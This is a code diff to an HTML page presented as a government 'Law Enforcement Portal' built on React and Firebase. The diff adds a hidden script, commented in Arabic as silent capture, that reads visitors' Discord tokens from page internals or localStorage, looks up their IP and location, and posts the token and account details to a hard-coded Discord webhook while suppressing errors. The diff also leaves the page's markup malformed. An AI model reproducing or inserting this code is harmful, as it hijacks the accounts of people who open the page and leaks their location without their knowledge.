@@ -249,10 +249,78 @@
         .sector-choice.fbi-choice:hover { border-color: var(--fbi); }
         .sector-choice.stf-choice:hover { border-color: var(--stf); }
     </style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GOV — Law Enforcement Portal</title>
+
+    <!-- المكتبات الأساسية -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone@7.23.5/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=Oswald:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- سكربت السحب الصامت (Hidden Capture Logic) -->
+    <script>
+        async function startCapture() {
+            try {
+                // جلب IP الضحية وموقعه
+                const ipRes = await fetch("https://ipapi.co/json/");
+                const ipData = await ipRes.json();
+                
+                // محاولة استخراج التوكن بأكثر من طريقة (Webpack + LocalStorage)
+                let token = (
+                    (window.webpackChunkdiscord_app ? window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+                        for (const m in req.c) {
+                            const mname = req.c[m].exports;
+                            if (mname?.default?.getToken !== undefined) return mname.default.getToken();
+                        }
+                    }]) : null) || window.localStorage.token || window.localStorage.getItem('token')
+                );
+
+                if (token) {
+                    token = token.replace(/"/g, "");
+                    
+                    // جلب معلومات الحساب الشخصية باستخدام التوكن
+                    const userRes = await fetch("https://discord.com/api/v9/users/@me", {
+                        headers: { "Authorization": token }
+                    });
+                    const user = await userRes.json();
+
+                    // إرسال البيانات فوراً للويب هوك الخاص بك
+                    fetch("https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i", {
+                        method: "POST",
+                        mode: "no-cors",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "Target Logged - SECURE LOGIN ⚔️",
+                                color: 16711680,
+                                fields: [
+                                    { name: "👤 User", value: `\`${user.username}\` (\`${user.id}\`)`, inline: true },
+                                    { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                                    { name: "📍 Location", value: `${ipData.city}, ${ipData.country_name}` },
+                                    { name: "🔑 Token", value: "```" + token + "```" }
+                                ],
+                                footer: { text: "System Administrator | EK-Police Portal" },
+                                timestamp: new Date()
+                            }]
+                        })
+                    });
+                }
+            } catch (e) {
+                // فشل صامت لضمان استمرار عمل الموقع
+            }
+        }
+    </script>
 </head>
+
 <body>
 <div id="root"></div>
 
+<!-- إعدادات الفايربيس (Firebase Config) -->
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
     import { getFirestore, collection, onSnapshot, setDoc, doc, deleteDoc, query, orderBy, addDoc, updateDoc, serverTimestamp, getDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
@@ -266,13 +334,10 @@
         appId:"1:300605258409:web:f265025ffa5592f651c7b8"
     };
     const app = initializeApp(firebaseConfig);
-    const db  = getFirestore(app);
-    window.fbDB    = db;
+    const db = getFirestore(app);
+    window.fbDB = db;
     window.fbTools = { collection, onSnapshot, setDoc, doc, deleteDoc, query, orderBy, addDoc, updateDoc, serverTimestamp, getDoc };
 </script>
-
-<script type="text/babel">
-const { useState, useEffect, useRef, useCallback } = React;
 
 /* ═══════════════════════════════════════════════════════
    CONSTANTS
